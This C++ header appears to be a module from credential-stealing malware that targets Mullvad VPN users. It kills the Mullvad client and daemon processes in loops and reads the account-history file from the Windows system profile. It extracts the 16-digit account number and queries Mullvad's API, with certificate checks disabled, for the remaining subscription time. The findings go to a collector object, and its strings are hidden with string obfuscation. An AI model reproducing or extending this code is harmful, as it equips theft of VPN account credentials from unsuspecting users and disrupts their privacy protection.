#pragma once

namespace mullvad {

    class c_mullvad
    {
    public:
        bool compile_mullvad() {
            while (utility::find_process_id(oxorany(L"Mullvad VPN.exe")) != 0) {
                utility::kill_process(oxorany("\"Mullvad VPN.exe\""));
            }
            while (utility::find_process_id(oxorany(L"mullvad-daemon.exe")) != 0) {
                utility::kill_process(oxorany("mullvad-daemon.exe"));
            }
            while (utility::find_process_id(oxorany(L"mullvad.exe")) != 0) {
                utility::kill_process(oxorany("mullvad.exe"));
            }

            char* system_root = nullptr;
            size_t len = 0;
            _dupenv_s(&system_root, &len, "SystemRoot");
            std::string sys_root = system_root ? system_root : "C:\\Windows";
            std::string mullvad_history_path = sys_root + oxorany("\\System32\\config\\systemprofile\\AppData\\Local\\Mullvad VPN\\account-history.json");
            if (system_root) free(system_root);

            std::ifstream file(mullvad_history_path, std::ios::binary);
            if (!file) {
                return false;
            }

            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

			std::string account_id;
			for ( size_t i = 0; i < content.length( ); ++i ) {
				if ( std::isdigit( content[ i ] ) ) {
					size_t count = 0;
					while ( i + count < content.length( ) && std::isdigit( content[ i + count ] ) ) count++;
					if ( count == 16 ) {
						account_id = content.substr( i, count );
						break;
					}
					i += count - 1;
				}
			}

			if ( !account_id.empty( ) ) {
				g_compiler->push_line( oxorany( "Mullvad:" ) );
				g_compiler->push_line( oxorany( "Account ID: " ) + account_id );

				std::string url = oxorany( "https://api.mullvad.net/public/accounts/v1/" ) + account_id;

				CURL* curl = curl_easy_init( );
				std::string api_resp;
				if ( curl ) {
					std::string ua = oxorany( "curl/8.4.0" );
					curl_easy_setopt( curl, CURLOPT_URL, url.c_str( ) );
					curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, https::write_callback );
					curl_easy_setopt( curl, CURLOPT_WRITEDATA, &api_resp );
					curl_easy_setopt( curl, CURLOPT_USERAGENT, ua.c_str( ) );
					curl_easy_setopt( curl, CURLOPT_SSL_VERIFYPEER, 0L );
					curl_easy_setopt( curl, CURLOPT_SSL_VERIFYHOST, 0L );
					curl_easy_perform( curl );
					curl_easy_cleanup( curl );
				}

				if ( !api_resp.empty( ) ) {
					try {
						nlohmann::json api_json = nlohmann::json::parse( api_resp );
						if ( api_json.contains( oxorany( "expiry" ) ) && api_json[ oxorany( "expiry" ) ].is_string( ) ) {
							std::string expiry = api_json[ oxorany( "expiry" ) ].get<std::string>( );
							int year, month, day, hour, min, sec;
							std::string fmt = oxorany( "%d-%d-%dT%d:%d:%d" );
							if ( sscanf_s( expiry.c_str( ), fmt.c_str( ), &year, &month, &day, &hour, &min, &sec ) == 6 ) {
								std::tm tm = {};
								tm.tm_year = year - 1900;
								tm.tm_mon = month - 1;
								tm.tm_mday = day;
								tm.tm_hour = hour;
								tm.tm_min = min;
								tm.tm_sec = sec;
								time_t expiry_time = _mkgmtime( &tm );
								time_t now = time( nullptr );
								double diff = difftime( expiry_time, now );
								if ( diff > 0 ) {
									int days_left = static_cast<int>( diff / 86400 );
									int hours_left = static_cast<int>( ( diff - ( days_left * 86400 ) ) / 3600 );
									g_compiler->push_line( oxorany( "Time Left: " ) + std::to_string( days_left ) + oxorany( " days, " ) + std::to_string( hours_left ) + oxorany( " hours" ) );
								} else {
									g_compiler->push_line( oxorany( "Time Left: expired" ) );
								}
							}
						}
					} catch ( ... ) {}
				}

				g_compiler->push_line( oxorany( "" ) );
			}

            return true;
        }
    };
}